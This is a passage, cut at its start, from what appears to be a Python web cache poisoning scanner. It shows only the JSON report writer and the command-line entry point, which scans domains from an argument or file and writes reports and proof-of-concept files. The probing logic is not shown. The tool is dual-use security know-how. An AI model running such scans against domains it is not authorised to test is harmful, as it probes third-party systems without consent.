                'timestamp': datetime.now().isoformat(),
                'scanner_version': '1.0',
                'total_domains': len(self.scan_results),
                'total_vulnerabilities': len(self.vulnerabilities)
            },
            'scan_results': self.scan_results,
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(json_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        logger.info(f"📊 JSON report generated: {json_file}")

async def main():
    parser = argparse.ArgumentParser(
        description='Web Cache Poisoning Scanner - CLI Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python cache_poison_scanner.py -d example.com
  python cache_poison_scanner.py -f domains.txt -o report.txt
  python cache_poison_scanner.py -d example.com --rate-limit 2.0 --concurrent 3
        """
    )
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-d', '--domain', help='Single domain to scan')
    group.add_argument('-f', '--file', help='File containing list of domains')
    
    parser.add_argument('-o', '--output', default='cache_poison_report.txt', 
                       help='Output report file (default: cache_poison_report.txt)')
    parser.add_argument('--poc', default='cache_poison_poc.txt',
                       help='POC file (default: cache_poison_poc.txt)')
    parser.add_argument('--json', default='cache_poison_results.json',
                       help='JSON report file (default: cache_poison_results.json)')
    parser.add_argument('--rate-limit', type=float, default=1.0, 
                       help='Delay between requests in seconds (default: 1.0)')
    parser.add_argument('--concurrent', type=int, default=5, 
                       help='Maximum concurrent requests (default: 5)')
    parser.add_argument('--verbose', '-v', action='store_true', 
                       help='Enable verbose logging')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Get domains to scan
    domains = []
    if args.domain:
        domains = [args.domain]
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                domains = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            logger.error(f"Domain file not found: {args.file}")
            sys.exit(1)
    
    if not domains:
        logger.error("No domains to scan")
        sys.exit(1)
    
    logger.info(f"🎯 Starting cache poisoning scan for {len(domains)} domain(s)")
    
    # Run scanner
    async with CachePoisonScanner(
        rate_limit=args.rate_limit,
        max_concurrent=args.concurrent
    ) as scanner:
        for domain in domains:
            try:
                await scanner.scan_domain(domain)
            except Exception as e:
                logger.error(f"Error scanning {domain}: {str(e)}")
                continue
        
        # Generate all report types
        scanner.generate_report(args.output)
        scanner.generate_poc_file(args.poc)
        scanner.generate_json_report(args.json)
    
    logger.info("✅ Cache poisoning scan completed!")
    logger.info(f"📄 Reports generated:")
    logger.info(f"   - Detailed Report: {args.output}")
    logger.info(f"   - POC File: {args.poc}")
    logger.info(f"   - JSON Report: {args.json}")

if __name__ == "__main__":
    asyncio.run(main())
